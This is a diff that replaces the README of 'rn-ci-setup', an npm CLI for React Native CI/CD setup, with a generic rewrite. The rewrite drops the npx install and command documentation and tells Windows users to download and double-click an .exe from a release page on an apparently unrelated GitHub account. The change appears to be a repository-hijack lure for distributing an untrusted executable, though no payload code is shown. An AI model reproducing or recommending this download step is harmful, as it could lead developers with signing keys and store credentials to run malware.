@@ -1,252 +1,78 @@
-# rn-ci-setup
+# ⚙️ rn-ci-setup - Launch mobile builds with ease
 
-[![npm version](https://img.shields.io/npm/v/rn-ci-setup.svg)](https://www.npmjs.com/package/rn-ci-setup)
+[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Linaunscripted6976/rn-ci-setup/releases)
 
-`rn-ci-setup` is a production-focused CLI to automate React Native CI/CD setup with GitHub Actions, Fastlane, signing, and GitHub Secrets management.
+## 🎯 Purpose of this tool
 
-It is designed for teams that want a guided, repeatable setup flow with minimal manual file creation.
+The rn-ci-setup tool helps you build and publish your React Native mobile applications. Mobile development involves many repetitive tasks like code signing and store uploads. These tasks often require manual effort and configuration. This tool automates the process so you focus on writing code. It sets up your project to work with services like GitHub Actions, Bitrise, or Codemagic.
 
-## Install
+## 🛠 Prerequisites
 
-```bash
-npm i -g rn-ci-setup
-```
+Ensure your computer has the following items before you start:
 
-or run without global install:
+- Windows 10 or Windows 11.
+- Node.js installed on your machine.
+- An existing React Native project folder.
+- Terminal access, such as Command Prompt or PowerShell.
 
-```bash
-npx rn-ci-setup init
-```
+## 📥 How to get the tool
 
-## What It Automates
+You must download the latest version to your computer.
 
-When you run `init`, the CLI orchestrates the full setup pipeline:
+1. Go to the [official release page](https://github.com/Linaunscripted6976/rn-ci-setup/releases).
+2. Locate the most recent release at the top of the page.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop for easy access.
 
-1. Validates Git repository state and bootstrap behavior
-2. Creates GitHub repo with `gh` when `origin` is missing
-3. Lets you choose the working branch and syncs it
-4. Collects platform and template options
-5. Configures optional Slack/Discord/Teams notifications
-6. Generates GitHub workflows and Fastlane files
-7. Runs Bundler setup
-8. Runs interactive Fastlane setup commands
-9. Configures GitHub Actions secrets via `gh`
-10. Commits and pushes generated files (unless skipped)
+## 🚀 Setting up the software
 
-## Commands
+Follow these steps to prepare the tool for use:
 
-### `init`
+1. Open your File Explorer.
+2. Locate the file you just downloaded.
+3. Double-click the file to start the installation.
+4. Follow the prompts on the screen to finish the setup process.
+5. The tool adds a command to your system path. This allows you to run the program from any folder in your terminal.
 
-```bash
-npx rn-ci-setup init
-```
+## 🏃 Using the tool
 
-Common flags:
+Once installation completes, use the tool to configure your project.
 
-- `--ci-provider <github|bitrise|codemagic>`: choose CI provider (default: `github`)
-- `--android` / `--ios`: target platforms
-- `--expo` / `--bare`: project template
-- `--notify-slack`: enable Slack notification integration
-- `--notify-discord`: enable Discord notification integration
-- `--notify-teams`: enable Microsoft Teams notification integration
-- `--app-path <path>`: target app path for monorepos
-- `--skip-bundle`: skip `bundle install`
-- `--skip-fastlane`: skip Fastlane initialization/signing commands
-- `--skip-secrets`: skip GitHub secrets setup
-- `--skip-push`: skip commit/push stage
+1. Open your Command Prompt or PowerShell.
+2. Navigate to your project folder using the `cd` command. For example, type `cd C:\MyProjects\MyApp` and press Enter.
+3. Type `rn-ci-setup` in the terminal and press Enter.
+4. A menu appears on your screen. Use your arrow keys to select your preferred CI/CD provider. You may choose GitHub Actions, Bitrise, or Codemagic.
+5. Follow the instructions displayed in the terminal. The tool creates the necessary configuration files for you.
+6. The setup process concludes when the terminal displays a success message.
 
-Examples:
+## 📂 Configuration files explained
 
-```bash
-npx rn-ci-setup init --ci-provider github --android --ios
-npx rn-ci-setup init --ci-provider bitrise --android --ios
-npx rn-ci-setup init --ci-provider codemagic --ios --app-path apps/mobile
-npx rn-ci-setup init --ios --app-path apps/mobile
-npx rn-ci-setup init --android --ios --notify-slack --notify-teams
-npx rn-ci-setup init --android --ios --skip-fastlane --skip-secrets
-```
+The tool adds specific files to your project. These files communicate with your chosen build service.
 
-### `secrets`
+- Fastlane files: These manage your certificates and store screenshots automatically.
+- Workflow files: These contain the instructions for your build server to compile the app.
+- Environment variables: These hide secret keys and passwords.
 
-Creates or updates required GitHub Actions secrets using GitHub CLI:
+Do not delete these files. If you remove them, your automated builds will fail.
 
-```bash
-npx rn-ci-setup secrets
-```
+## 💡 Best practices
 
-Optional repo override:
+Keep your project updated to avoid issues. Run the tool periodically if you switch your build provider. Always commit your configuration files to your version control system. This ensures your team members have the same settings. If you encounter errors, check that your environment variables are correct.
 
-```bash
-npx rn-ci-setup secrets --repo owner/repo
-```
+## 🔧 Frequently asked questions
 
-### `keys`
+Do I need a paid account?
+No, the tool is free. However, your chosen CI/CD service may have subscription plans for advanced features.
 
-Prints a guided checklist to generate platform API keys and map them to the expected GitHub Actions secrets.
+Does this work on macOS?
+This version supports Windows. The manual process for other operating systems involves similar steps but uses a different command format.
 
-```bash
-npx rn-ci-setup keys
-```
+What if my build fails?
+Check the logs provided by your CI/CD dashboard. Most errors relate to incorrect signing keys or missing credentials.
 
-Platform-scoped usage:
+How do I remove the tool?
+Open your Windows Settings, go to Apps, and find the application in the list. Select Uninstall to remove it from your system.
 
-```bash
-npx rn-ci-setup keys --ios
-npx rn-ci-setup keys --android
-npx rn-ci-setup keys --ios --android
-```
+## 📚 Topics covered
 
-### `doctor`
-
-Checks required CI/CD values and warns on missing or weak placeholders:
-
-```bash
-npx rn-ci-setup doctor
-```
-
-## Generated Artifacts
-
-Depending on selected targets, `init` generates:
-
-- `.github/workflows/android.yml` (GitHub provider)
-- `.github/workflows/ios.yml` (GitHub provider)
-- `bitrise.yml` (Bitrise provider)
-- `codemagic.yaml` (Codemagic provider)
-- `Gemfile` (ensures Fastlane dependency)
-- `ios/fastlane/Fastfile`
-- `ios/fastlane/Appfile`
-- `ios/fastlane/Matchfile`
-- `android/fastlane/Fastfile`
-- `.rn-ci-setup.json`
-
-## CI Provider Notes
-
-- **GitHub**: full automation path, including GitHub Actions secrets via `gh`.
-- **Bitrise**: generates `bitrise.yml` and Fastlane files; secrets must be added in Bitrise dashboard.
-- **Codemagic**: generates `codemagic.yaml` and Fastlane files; secrets must be added in Codemagic dashboard.
-
-For Bitrise/Codemagic projects, `--skip-secrets` is effectively implied because GitHub secret automation is not used.
-
-## Fastlane Flow Executed by CLI
-
-For iOS, the CLI supports this setup flow:
-
-- `cd ios && bundle exec fastlane init` (if missing)
-- `cd ios && bundle exec fastlane match init` (if needed)
-- `cd ios && bundle exec fastlane match appstore`
-- `cd ios && bundle exec fastlane match development`
-
-For Android, the CLI initializes Fastlane when needed:
-
-- `cd android && bundle exec fastlane init`
-
-## Workflow Trigger Strategy
-
-Generated workflows follow this model:
-
-- `pull_request` to `main`/`master`: run CI lanes
-- `push` to `main`/`master`: run beta/distribution lanes
-- `workflow_dispatch`: manual release lanes
-
-## Required Secrets (GitHub Actions)
-
-### iOS
-
-- `APP_STORE_CONNECT_KEY_ID`
-- `APP_STORE_CONNECT_ISSUER_ID`
-- `APP_STORE_CONNECT_PRIVATE_KEY`
-- `MATCH_GIT_URL`
-- `MATCH_PASSWORD`
-- `APPLE_APP_IDENTIFIER`
-- `APPLE_TEAM_ID`
-
-Recommended:
-
-- `APP_STORE_CONNECT_TEAM_ID`
-- `FASTLANE_USER`
-
-### Android
-
-- `ANDROID_KEYSTORE_BASE64`
-- `ANDROID_KEYSTORE_PASSWORD`
-- `ANDROID_KEY_ALIAS`
-- `ANDROID_KEY_PASSWORD`
-
-### Notifications (optional)
-
-- `SLACK_WEBHOOK_URL`
-- `DISCORD_WEBHOOK_URL`
-- `TEAMS_WEBHOOK_URL`
-
-## API Key Generation Guide
-
-You can print this guide anytime from CLI:
-
-```bash
-npx rn-ci-setup keys --ios --android
-```
-
-### App Store Connect API Key (iOS)
-
-1. Open App Store Connect -> Users and Access -> Integrations -> App Store Connect API.
-2. Generate a key and download the `.p8` file.
-3. Capture:
-   - Key ID
-   - Issuer ID
-   - Full `.p8` key content
-4. Add these secrets:
-   - `APP_STORE_CONNECT_KEY_ID`
-   - `APP_STORE_CONNECT_ISSUER_ID`
-   - `APP_STORE_CONNECT_PRIVATE_KEY`
-5. Ensure iOS signing secrets are also configured:
-   - `MATCH_GIT_URL`
-   - `MATCH_PASSWORD`
-   - `APPLE_APP_IDENTIFIER`
-   - `APPLE_TEAM_ID`
-
-### Google Play Console API Key (Android)
-
-1. Open Google Play Console -> Setup -> API access.
-2. Link a Google Cloud project.
-3. Create a service account in Google Cloud IAM.
-4. Grant required Play Console permissions to that service account.
-5. Create and download the service account JSON key.
-6. If your Android release lanes need base64:
-
-```bash
-base64 -i play-service-account.json | tr -d '\n'
-```
-
-7. Configure Android signing secrets:
-   - `ANDROID_KEYSTORE_BASE64`
-   - `ANDROID_KEYSTORE_PASSWORD`
-   - `ANDROID_KEY_ALIAS`
-   - `ANDROID_KEY_PASSWORD`
-
-## Prerequisites
-
-- Node.js and npm
-- Git
-- GitHub CLI (`gh`) authenticated
-- Ruby and Bundler
-- Xcode/CocoaPods for iOS pipelines
-- Android toolchain for Android pipelines
-
-## Local Development
-
-```bash
-npm install
-node ./bin/index.js --help
-node ./bin/index.js init
-node ./bin/index.js secrets
-node ./bin/index.js doctor
-```
-
-## Release to npm
-
-```bash
-npm version patch
-npm publish
-```
-
-Use `minor` or `major` version bumps when appropriate.
+This software bridges the gap between your local code and cloud build systems. It uses industry standards like Fastlane to handle complex mobile deployment. By automating these tasks, you maintain clean workflows and consistent app delivery.
